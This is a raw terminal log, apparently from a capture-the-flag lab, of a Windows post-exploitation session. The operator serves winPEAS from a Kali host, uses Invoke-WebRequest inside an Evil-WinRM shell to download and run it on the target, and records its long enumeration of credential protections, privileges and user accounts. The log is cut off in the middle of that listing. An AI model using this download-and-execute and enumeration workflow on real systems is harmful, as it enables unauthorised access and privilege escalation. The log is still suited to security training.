CVE-2021-1675.ps1  hook.lnk  Info.txt         users.xml
hash_michelle      hook.zip  users_final.txt  winPEASany_ofs.exe
                                                                                                              
┌──(kali㉿kali)-[~/Set]
└─$ chmod +x winPEASany_ofs.exe                                             
                                                                                                              
┌──(kali㉿kali)-[~/Set]
└─$ ls
CVE-2021-1675.ps1  hook.lnk  Info.txt         users.xml
hash_michelle      hook.zip  users_final.txt  winPEASany_ofs.exe
                                                                                                              
┌──(kali㉿kali)-[~/Set]
└─$ python3 -m http.server 1337                                                    
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
10.10.242.97 - - [02/Jan/2023 12:46:19] "GET /winPEASany_ofs.exe HTTP/1.1" 200 -

*Evil-WinRM* PS C:\Users\MichelleWat\Desktop> Invoke-WebRequest http://10.8.19.103:1337/winPEASany_ofs.exe -o winPEASany_ofs.exe
*Evil-WinRM* PS C:\Users\MichelleWat\Desktop> ls


    Directory: C:\Users\MichelleWat\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/16/2020   2:07 PM             52 Flag2.txt
-a----         1/2/2023   9:46 AM        1829376 winPEASany_ofs.exe


*Evil-WinRM* PS C:\Users\MichelleWat\Desktop> .\winPEASany_ofs.exe
ANSI color bit for Windows is not set. If you are execcuting this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD

               ((((((((((((((((((((((((((((((((                                                               
        (((((((((((((((((((((((((((((((((((((((((((                                                           
      ((((((((((((((**********/##########(((((((((((((                                                        
    ((((((((((((********************/#######(((((((((((                                                       
    ((((((((******************/@@@@@/****######((((((((((                                                     
    ((((((********************@@@@@@@@@@/***,####((((((((((                                                   
    (((((********************/@@@@@%@@@@/********##(((((((((                                                  
    (((############*********/%@@@@@@@@@/************((((((((                                                  
    ((##################(/******/@@@@@/***************((((((                                                  
    ((#########################(/**********************(((((                                                  
    ((##############################(/*****************(((((                                                  
    ((###################################(/************(((((                                                  
    ((#######################################(*********(((((                                                  
    ((#######(,.***.,(###################(..***.*******(((((                                                  
    ((#######*(#####((##################((######/(*****(((((                                                  
    ((###################(/***********(##############()(((((                                                  
    (((#####################/*******(################)((((((                                                  
    ((((############################################)((((((                                                   
    (((((##########################################)(((((((                                                   
    ((((((########################################)(((((((                                                    
    ((((((((####################################)((((((((                                                     
    (((((((((#################################)(((((((((                                                      
        ((((((((((##########################)(((((((((                                                        
              ((((((((((((((((((((((((((((((((((((((                                                          
                 ((((((((((((((((((((((((((((((                                                               

ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own devices and/or with the device owner's permission.                                                         
                                                                                                              
  WinPEAS-ng by @carlospolopm                                                                                 

       /---------------------------------------------------------------------------------\                    
       |                             Do you like PEASS?                                  |                    
       |---------------------------------------------------------------------------------|                    
       |         Get the latest version    :     https://github.com/sponsors/carlospolop |                    
       |         Follow on Twitter         :     @carlospolopm                           |                    
       |         Respect on HTB            :     SirBroccoli                             |                    
       |---------------------------------------------------------------------------------|                    
       |                                 Thank you!                                      |                    
       \---------------------------------------------------------------------------------/                    
                                                                                                              
  [+] Legend:
         Red                Indicates a special privilege over an object or something is misconfigured
         Green              Indicates that some protection is enabled or something is well configured
         Cyan               Indicates active users
         Blue               Indicates disabled users
         LightYellow        Indicates links

È You can find a Windows local PE Checklist here: https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation                                                                                      
   Creating Dynamic lists, this could take a while, please wait...
   - Loading sensitive_files yaml definitions file...
   - Loading regexes yaml definitions file...
   - Checking if domain...
   - Getting Win32_UserAccount info...
Error while getting Win32_UserAccount info: System.Management.ManagementException: Access denied
   at System.Management.ThreadDispatch.Start()                                                                
   at System.Management.ManagementScope.Initialize()                                                          
   at System.Management.ManagementObjectSearcher.Initialize()                                                 
   at System.Management.ManagementObjectSearcher.Get()                                                        
   at winPEAS.Checks.Checks.c()                                                                               
   - Creating current user groups list...
   - Creating active users list (local only)...
  [X] Exception: Object reference not set to an instance of an object.
   - Creating disabled users list...
  [X] Exception: Object reference not set to an instance of an object.
   - Admin users list...
  [X] Exception: Object reference not set to an instance of an object.
   - Creating AppLocker bypass list...
   - Creating files/directories list for search...


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ System Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Basic System Information
È Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#kernel-exploits                                                        
  [X] Exception: Access denied 
  [X] Exception: Access denied 
  [X] Exception: The given key was not present in the dictionary.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing All Microsoft Updates
  [X] Exception: Creating an instance of the COM component with CLSID {B699E5E8-67FF-4177-88B0-3684A3388BFB} from the IClassFactory failed due to the following error: 80070005 Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED)).                                                                                  

ÉÍÍÍÍÍÍÍÍÍÍ¹ System Last Shutdown Date/time (from Registry)
                                                                                                              
    Last Shutdown Date/time        :    7/30/2020 1:33:25 AM

ÉÍÍÍÍÍÍÍÍÍÍ¹ User Environment Variables
È Check for some passwords or keys in the env variables 
    COMPUTERNAME: SET
    USERPROFILE: C:\Users\MichelleWat
    HOMEPATH: \Users\MichelleWat
    LOCALAPPDATA: C:\Users\MichelleWat\AppData\Local
    PSModulePath: C:\Users\MichelleWat\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\windows\system32\WindowsPowerShell\v1.0\Modules
    PROCESSOR_ARCHITECTURE: AMD64
    Path: C:\windows\system32;C:\windows;C:\windows\System32\Wbem;C:\windows\System32\WindowsPowerShell\v1.0\;C:\windows\System32\OpenSSH\;C:\Program Files\Microsoft\Web Platform Installer\;C:\Users\MichelleWat\AppData\Local\Microsoft\WindowsApps
    CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
    ProgramFiles(x86): C:\Program Files (x86)
    PROCESSOR_LEVEL: 6
    LOGONSERVER: \\SET
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
    HOMEDRIVE: C:
    SystemRoot: C:\windows
    ALLUSERSPROFILE: C:\ProgramData
    DriverData: C:\Windows\System32\Drivers\DriverData
    APPDATA: C:\Users\MichelleWat\AppData\Roaming
    PROCESSOR_REVISION: 3f02
    USERNAME: MichelleWat
    CommonProgramW6432: C:\Program Files\Common Files
    CommonProgramFiles: C:\Program Files\Common Files
    OS: Windows_NT
    USERDOMAIN_ROAMINGPROFILE: SET
    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 63 Stepping 2, GenuineIntel
    ComSpec: C:\windows\system32\cmd.exe
    SystemDrive: C:
    TEMP: C:\Users\MICHEL~1\AppData\Local\Temp
    ProgramFiles: C:\Program Files
    NUMBER_OF_PROCESSORS: 1
    __PSLockdownPolicy: 4
    TMP: C:\Users\MICHEL~1\AppData\Local\Temp
    ProgramData: C:\ProgramData
    ProgramW6432: C:\Program Files
    windir: C:\windows
    USERDOMAIN: SET
    PUBLIC: C:\Users\Public

ÉÍÍÍÍÍÍÍÍÍÍ¹ System Environment Variables
È Check for some passwords or keys in the env variables 
    __PSLockdownPolicy: 4
    ComSpec: C:\windows\system32\cmd.exe
    DriverData: C:\Windows\System32\Drivers\DriverData
    NUMBER_OF_PROCESSORS: 1
    OS: Windows_NT
    Path: C:\windows\system32;C:\windows;C:\windows\System32\Wbem;C:\windows\System32\WindowsPowerShell\v1.0\;C:\windows\System32\OpenSSH\;C:\Program Files\Microsoft\Web Platform Installer\
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
    PROCESSOR_ARCHITECTURE: AMD64
    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 63 Stepping 2, GenuineIntel
    PROCESSOR_LEVEL: 6
    PROCESSOR_REVISION: 3f02
    PSModulePath: C:\Program Files\WindowsPowerShell\Modules;C:\windows\system32\WindowsPowerShell\v1.0\Modules
    TEMP: C:\windows\TEMP
    TMP: C:\windows\TEMP
    USERNAME: SYSTEM
    windir: C:\windows

ÉÍÍÍÍÍÍÍÍÍÍ¹ Audit Settings
È Check what is being logged 
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Audit Policy Settings - Classic & Advanced

ÉÍÍÍÍÍÍÍÍÍÍ¹ WEF Settings
È Windows Event Forwarding, is interesting to know were are sent the logs 
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ LAPS Settings
È If installed, local administrator password is changed frequently and is restricted by ACL 
    LAPS Enabled: LAPS not installed

ÉÍÍÍÍÍÍÍÍÍÍ¹ Wdigest
È If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#wdigest                                                                   
    Wdigest is not enabled

ÉÍÍÍÍÍÍÍÍÍÍ¹ LSA Protection
È If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#lsa-protection                                                                                        
    LSA Protection is not enabled

ÉÍÍÍÍÍÍÍÍÍÍ¹ Credentials Guard
È If enabled, a driver is needed to read LSASS memory https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#credential-guard                                                           
    CredentialGuard is not enabled

ÉÍÍÍÍÍÍÍÍÍÍ¹ Cached Creds
È If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#cached-credentials                            
    cachedlogonscount is 10

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating saved credentials in Registry (CurrentPass)

ÉÍÍÍÍÍÍÍÍÍÍ¹ AV Information
  [X] Exception: Invalid namespace 
    No AV was detected!!
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Windows Defender configuration
  Local Settings
  Group Policy Settings

ÉÍÍÍÍÍÍÍÍÍÍ¹ UAC Status
È If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access                              
    ConsentPromptBehaviorAdmin: 5 - PromptForNonWindowsBinaries
    EnableLUA: 1
    LocalAccountTokenFilterPolicy: 
    FilterAdministratorToken: 
      [*] LocalAccountTokenFilterPolicy set to 0 and FilterAdministratorToken != 1.
      [-] Only the RID-500 local admin account can be used for lateral movement.                              

ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.17763.1
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: 
    PS history size: 

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating PowerShell Session Settings using the registry
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ PS default transcripts history
È Read the PS history inside these files (if any)

ÉÍÍÍÍÍÍÍÍÍÍ¹ HKCU Internet Settings
    DisableCachingOfSSLPages: 1
    IE5_UA_Backup_Flag: 5.0
    PrivacyAdvanced: 1
    SecureProtocols: 2688
    User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
    CertificateRevocation: 1
    ZonesSecurityUpgrade: System.Byte[]
    EnableNegotiate: 1
    MigrateProxy: 1
    ProxyEnable: 0
    WarnonZoneCrossing: 1

ÉÍÍÍÍÍÍÍÍÍÍ¹ HKLM Internet Settings
    ActiveXCache: C:\Windows\Downloaded Program Files
    CodeBaseSearchPath: CODEBASE
    EnablePunycode: 1
    MinorVersion: 0
    WarnOnIntranet: 1

ÉÍÍÍÍÍÍÍÍÍÍ¹ Drives Information
È Remember that you should search more info inside the other drives 
    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 23 GB)(Permissions: Users [AppendData/CreateDirectories])                                                                                                          
    E:\ (Type: Fixed)(Filesystem: FAT32)(Available space: 0 GB)(Permissions: Everyone [AllAccess])
    F:\ (Type: Fixed)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking WSUS
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wsus
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking KrbRelayUp
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#krbrelayup
  The system isn't inside a domain, so it isn't vulnerable

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking If Inside Container
È If the binary cexecsvc.exe or associated service exists, you are inside Docker 
You are NOT inside a container

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking AlwaysInstallElevated
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated
    AlwaysInstallElevated isn't available

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerate LSA settings - auth packages included
                                                                                                              
    auditbasedirectories                 :       0
    auditbaseobjects                     :       0
    Bounds                               :       00-30-00-00-00-20-00-00
    crashonauditfail                     :       0
    fullprivilegeauditing                :       00
    LimitBlankPasswordUse                :       1
    NoLmHash                             :       1
    Security Packages                    :       ""
    Notification Packages                :       rassfm,scecli
    Authentication Packages              :       msv1_0
    LsaPid                               :       788
    LsaCfgFlagsDefault                   :       0
    SecureBoot                           :       1
    ProductType                          :       7
    disabledomaincreds                   :       0
    everyoneincludesanonymous            :       0
    forceguest                           :       0
    restrictanonymous                    :       0
    restrictanonymoussam                 :       1

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating NTLM Settings
  LanmanCompatibilityLevel    :  (Send NTLMv2 response only - Win7+ default)
                                                                                                              

  NTLM Signing Settings                                                                                       
      ClientRequireSigning    : False
      ClientNegotiateSigning  : True
      ServerRequireSigning    : False
      ServerNegotiateSigning  : False
      LdapSigning             : Negotiate signing (Negotiate signing)

  Session Security                                                                                            
      NTLMMinClientSec        : 536870912 (Require 128-bit encryption)
      NTLMMinServerSec        : 536870912 (Require 128-bit encryption)
                                                                                                              

  NTLM Auditing and Restrictions                                                                              
      InboundRestrictions     :  (Not defined)
      OutboundRestrictions    :  (Not defined)
      InboundAuditing         :  (Not defined)
      OutboundExceptions      :

ÉÍÍÍÍÍÍÍÍÍÍ¹ Display Local Group Policy settings - local users/machine

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking AppLocker effective policy
   AppLockerPolicy version: 1
   listing rules:



ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Printers (WMI)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Named Pipes
  Name                                                                                                 CurrentUserPerms                                                       Sddl

  eventlog                                                                                             Everyone [WriteData/CreateFiles]                                       O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)

  ROUTER                                                                                               Everyone [WriteData/CreateFiles]                                       O:SYG:SYD:P(A;;0x12019b;;;WD)(A;;0x12019b;;;AN)(A;;FA;;;SY)


ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating AMSI registered providers
    Provider:       {2781761E-28E0-4109-99FE-B9D127C57AFE}
    Path:           "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2006.10-0\MpOav.dll"

   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Sysmon configuration
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Sysmon process creation logs (1)
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Installed .NET versions
                                                                                                              


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Interesting Events information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Printing Explicit Credential Events (4648) for last 30 days - A process logged on using plaintext credentials                                                                                                  
                                                                                                              
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Printing Account Logon Events (4624) for the last 10 days.
                                                                                                              
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Process creation events - searching logs (EID 4688) for sensitive data.
                                                                                                              
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell events - script block logs (EID 4104) - searching for sensitive data.
                                                                                                              
  [X] Exception: Attempted to perform an unauthorized operation.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Displaying Power off/on events for last 5 days
                                                                                                              
System.UnauthorizedAccessException: Attempted to perform an unauthorized operation.
   at System.Diagnostics.Eventing.Reader.EventLogException.Throw(Int32 errorCode)
   at System.Diagnostics.Eventing.Reader.NativeWrapper.EvtQuery(EventLogHandle session, String path, String query, Int32 flags)
   at System.Diagnostics.Eventing.Reader.EventLogReader..ctor(EventLogQuery eventQuery, EventBookmark bookmark)
   at winPEAS.Helpers.MyUtils.GetEventLogReader(String path, String query, String computerName)
   at hk.a.b()
   at in.a()


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Users Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Users
È Check if you have some admin equivalent privileges https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#users-and-groups                                                                      
  [X] Exception: Object reference not set to an instance of an object.
  Current user: MichelleWat
  Current groups: Domain Users, Everyone, Builtin\Remote Management Users, Users, Network, Authenticated Users, This Organization, Local account, NTLM Authentication
   =================================================================================================

    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current User Idle Time
   Current User   :     SET\MichelleWat
   Idle Time      :     03h:04m:53s:250ms

ÉÍÍÍÍÍÍÍÍÍÍ¹ Display Tenant information (DsRegCmd.exe /status)
   Tenant is NOT Azure AD Joined.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current Token privileges
È Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#token-manipulation                                                          
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED

ÉÍÍÍÍÍÍÍÍÍÍ¹ Clipboard text

ÉÍÍÍÍÍÍÍÍÍÍ¹ Logged users
  [X] Exception: Access denied 
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Display information about local users
   Computer Name           :   SET
   User Name               :   AaronWhe
   User Id                 :   2027
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:15 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   AddisonRus
   User Id                 :   2085
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:23 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   Administrator
   User Id                 :   500
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :   Built-in account for administering the computer/domain
   Last Logon              :   7/30/2020 12:41:34 AM
   Logons Count            :   39
   Password Last Set       :   6/15/2020 1:29:26 PM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   AidenBoy
   User Id                 :   2039
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:16 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   AlicePet
   User Id                 :   2031
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:15 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   AllisonNea
   User Id                 :   2073
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:21 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   AlyssaBak
   User Id                 :   1978
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:08 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   AndreaCur
   User Id                 :   1989
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:09 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   AndreaHar
   User Id                 :   1985
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:09 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   AndreaSte
   User Id                 :   2048
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:18 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   AndrewPow
   User Id                 :   2017
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:13 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   AubreeHop
   User Id                 :   2004
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:11 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   BeckyWel
   User Id                 :   2040
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:17 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   BernardMck
   User Id                 :   2045
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:17 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   BillieHil
   User Id                 :   1981
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:08 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   BillieRya
   User Id                 :   1997
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:10 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   BrandonSpe
   User Id                 :   2030
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:15 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   BrandyRod
   User Id                 :   1996
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:10 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   BraydenHaw
   User Id                 :   2086
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:24 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   BraydenWeb
   User Id                 :   2038
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:16 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   ByronWil
   User Id                 :   2001
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:11 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   CalebRod
   User Id                 :   2020
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:14 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   ChloeWes
   User Id                 :   2012
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:13 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   ChristineRui
   User Id                 :   2091
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:24 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   ClaireHay
   User Id                 :   1994
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:10 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   CraigMcd
   User Id                 :   2006
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:11 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   DanaRos
   User Id                 :   2032
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:15 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   DanielleTho
   User Id                 :   2050
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:18 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   DarrellPea
   User Id                 :   2089
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:24 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   DefaultAccount
   User Id                 :   503
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   A user account managed by the system.
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   DonBur
   User Id                 :   2037
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:16 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   DonPer
   User Id                 :   2002
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:11 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   EdnaHow
   User Id                 :   2021
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:14 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   EdnaPer
   User Id                 :   2016
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:13 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   EdnaRey
   User Id                 :   2094
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:25 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   EugeneWoo
   User Id                 :   2080
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:23 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   FernandoHun
   User Id                 :   1987
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:09 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   FlennRod
   User Id                 :   2087
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   6/12/2020 11:22:24 AM

   =================================================================================================

   Computer Name           :   SET
   User Name               :   FloydPet
